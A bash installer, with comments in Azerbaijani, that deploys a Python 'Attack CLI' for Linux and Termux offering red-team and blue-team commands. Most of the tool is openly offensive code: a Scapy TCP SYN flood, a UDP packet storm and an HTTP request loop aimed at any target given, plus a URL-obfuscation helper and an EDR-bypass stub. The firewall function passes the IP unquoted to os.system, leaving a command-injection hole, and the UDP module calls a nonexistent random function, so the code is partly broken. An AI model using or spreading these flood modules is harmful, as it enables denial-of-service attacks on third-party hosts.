#!/bin/bash

# ==============================================================================
#                 ATTACK FOR BT/RT - LINUX & ANDROID INSTALLER
# ==============================================================================

echo "=== Attack for BT/RT Official Installer (Linux / Termux) ==="
echo "[*] Initializing environment checks..."

# 1. Platformanın Təyini
if [ -d "/data/data/com.termux/files/usr/bin" ]; then
    PLATFORM="ANDROID"
    BIN_DIR="/data/data/com.termux/files/usr/bin"
    echo "[+] Platform detected: Android (Termux)"
else
    PLATFORM="LINUX"
    BIN_DIR="/usr/local/bin"
    echo "[+] Platform detected: Linux Desktop/Server"
fi

# 2. Python3 Yoxlanılması
echo "[*] Verifying Python3 installation..."
if ! command -v python3 &> /dev/null; then
    echo "[!] Python3 not found. Installing..."
    if [ "$PLATFORM" = "ANDROID" ]; then
        pkg update -y && pkg install -y python python-pip
    else
        sudo apt update && sudo apt install -y python3 python3-pip
    fi
fi

# 3. Kitabxanaların Yüklənməsi
echo "[*] Installing cyber libraries (Scapy & Requests)..."
pip3 install scapy requests --quiet --break-system-packages 2>/dev/null || pip3 install scapy requests --quiet

# 4. Mərkəzi Attack Mühərrikinin Yazılması
echo "[*] Deploying Attack Core Engine..."

cat << 'EOF' > "$BIN_DIR/attack"
#!/usr/bin/env python3
import os, sys, re, base64, requests, socket, random
from scapy.all import IP, TCP, UDP, send

def is_root():
    try: return os.getuid() == 0
    except: return False

class RedTeamModules:
    def DDoS_SYN(self, target):
        print(f"[🔥 RT-ATTACK] Target: {target} -> Launching real TCP SYN Flood via Scapy...")
        try:
            target_ip = socket.gethostbyname(target)
            for _ in range(50):
                pkt = IP(dst=target_ip)/TCP(dport=80, flags="S")
                send(pkt, verbose=0)
            print(f"[✓] SYN Flood packets dispatched to {target_ip}")
        except Exception as e: print(f"[X] SYN Error: {e}")

    def DDoS_UDP(self, target):
        print(f"[🔥 RT-ATTACK] Target: {target} -> Launching UDP Packet Storm...")
        try:
            target_ip = socket.gethostbyname(target)
            payload = random._urbytes(1024)
            for _ in range(50):
                pkt = IP(dst=target_ip)/UDP(dport=random.randint(1024, 65535))/payload
                send(pkt, verbose=0)
            print(f"[✓] UDP Storm sent to {target_ip}")
        except Exception as e: print(f"[X] UDP Error: {e}")

    def DDoS_HTTP(self, target):
        print(f"[🔥 RT-ATTACK] Target: {target} -> Launching Layer 7 HTTP Flood...")
        headers = {'User-Agent': 'Mozilla/5.0 (CyberCLI/5.5)'}
        try:
            url = target if target.startswith("http") else f"http://{target}"
            for i in range(5):
                res = requests.get(url, headers=headers, timeout=3)
                print(f"[*] Request {i+1}: Status Code -> {res.status_code}")
        except Exception as e: print(f"[X] HTTP Error: {e}")

    def Bypass_EDR(self, target):
        print(f"[🔥 RT-BYPASS] Attempting user-land hook neutralization on: {target}")

class BlueTeamModules:
    def Scan_Signature(self, path):
        print(f"[🛡️ BT-DEFENSE] Scanning path for signatures: {path}")
        if os.path.exists(path): print("[✓] Signature scan completed.")
        else: print("[X] Path does not exist.")

    def Defend_FIREWALL_BLOCK(self, bad_ip):
        print(f"[🛡️ BT-DEFENSE] Executing firewall rule for IP: {bad_ip}")
        if not is_root():
            print("[X] Error: Firewall manipulation requires root privileges!")
            return
        os.system(f"iptables -A INPUT -s {bad_ip} -j DROP")
        print(f"[✓] IP {bad_ip} blocked via iptables.")

RT_CORE = RedTeamModules()
BT_CORE = BlueTeamModules()
COMMAND_REGISTRY = {}
LAST_BASE64_LINK = ""

def show_help():
    print("""
================================================================================
                           ATTACK CLI v5.5 (Linux/Termux)
================================================================================
    help                                      - Show manual.
    exit                                      - Quit shell.
    pil(<url>)                                - Download package via HTTP.
    Base64inlink://<url>                      - Obfuscate URL.

[🔥] RED TEAM:
    Attack/DDoS./RT/SYN("<target_ip>")       - TCP SYN Flood.
    Attack/DDoS./RT/UDP("<target_ip>")       - UDP Packet Storm.
    Attack/DDoS./RT/HTTP("<url>")             - Layer 7 HTTP Stress Test.

[🛡️] BLUE TEAM:
    Scanfiles/BT/Signature("<path>")          - Threat signature scanner.
    Firewall/BT/FIREWALL_BLOCK("<bad_ip>")    - IP block rule.
================================================================================
""")

def execute_line(line):
    global LAST_BASE64_LINK
    line = line.strip()
    if not line or line.startswith("//"): return
    if line.lower() == "help": show_help(); return
    if line.startswith("pil("):
        match = re.search(r"pil\((.+)\)", line)
        if match:
            url = match.group(1).replace('"', '').strip()
            try:
                res = requests.get(url, timeout=10)
                if res.status_code == 200:
                    fname = url.split("/")[-1] if "." in url.split("/")[-1] else "package.pkg"
                    with open(fname, 'wb') as f: f.write(res.content)
                    print(f"[✓] Downloaded as '{fname}'")
            except Exception as e: print(f"[X] Error: {e}")
        return
    if line.startswith("Base64inlink://"):
        match = re.search(r"Base64inlink://(.+)", line)
        if match:
            link = match.group(1).strip()
            LAST_BASE64_LINK = base64.b64encode(link.encode('utf-8')).decode('utf-8')
            print(f"[🔑 HASH]: {LAST_BASE64_LINK}")
        return
    if line.startswith("Attack/"):
        match = re.search(r"Attack/([\w]+)\./RT/([\w]+)\((.+)\)", line)
        if match:
            func = f"{match.group(1)}_{match.group(2)}"
            p = match.group(3).replace('"', '')
            if hasattr(RT_CORE, func): getattr(RT_CORE, func)(p)
        return
    match_bt = re.search(r"([\w]+)/BT/([\w]+)\((.+)\)", line)
    if match_bt:
        mod = "Defend" if match_bt.group(1) == "Firewall" else match_bt.group(1)
        if mod == "Scanfiles": mod = "Scan"
        func = f"{mod}_{match_bt.group(2)}"
        p = match_bt.group(3).replace('"', '')
        if hasattr(BT_CORE, func): getattr(BT_CORE, func)(p)
        return
    print(f"[Syntax Error] Unknown command -> {line}")

print("=== Attack for BT/RT CLI Engine ===")
prompt = "@Root" if is_root() else "@unroot"
while True:
    try:
        inp = input(f"{prompt} Attack> ")
        if inp.strip().lower() == "exit": break
        execute_line(inp)
    except KeyboardInterrupt: break
EOF

chmod +x "$BIN_DIR/attack"
echo "========================================================================"
echo "[✓] SUCCESS: Attack CLI installed successfully!"
echo "[*] Type 'attack' from anywhere to launch."
echo "========================================================================"
